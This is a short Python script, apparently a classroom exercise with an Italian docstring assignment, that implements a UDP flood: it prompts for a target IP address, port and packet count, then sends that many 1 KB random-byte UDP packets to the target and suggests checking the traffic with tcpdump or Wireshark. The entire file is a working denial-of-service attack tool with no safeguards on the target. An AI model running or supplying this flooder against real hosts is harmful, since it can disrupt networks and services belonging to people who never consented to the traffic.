''' scrivere un programma in Python che simuli un UDP flood.
1.Il programma deve richiedere IP target (input)
2.Il programma deve richiedere porta target (input)
3.La grandezza dei pacchetti da inviare è di 1 KB per pacchetto 
4.Il programma deve chiedere quanti pacchetti da 1 KB inviare (input)

Verifica funzionamento: <sudo tcpdump -i any port (num.porta)> da zsh o Wireshark'''

import socket as so
from random import randbytes

s = so.socket(so.AF_INET,so.SOCK_DGRAM)
bytes = randbytes(1024)

def attacco():

    ip = input("\nInserisci indirizzo IP: \n")
    porta = int(input("\nInserisci porta: \n"))
    pacchetti = int(input("\nQuanti pacchetti vuoi inviare?\n"))
    addr = (ip,porta)


    for i in range(pacchetti):
        s.sendto(bytes,addr)
    print("UDP inviati!")

    s.close()

if __name__ == "__main__":
    attacco()

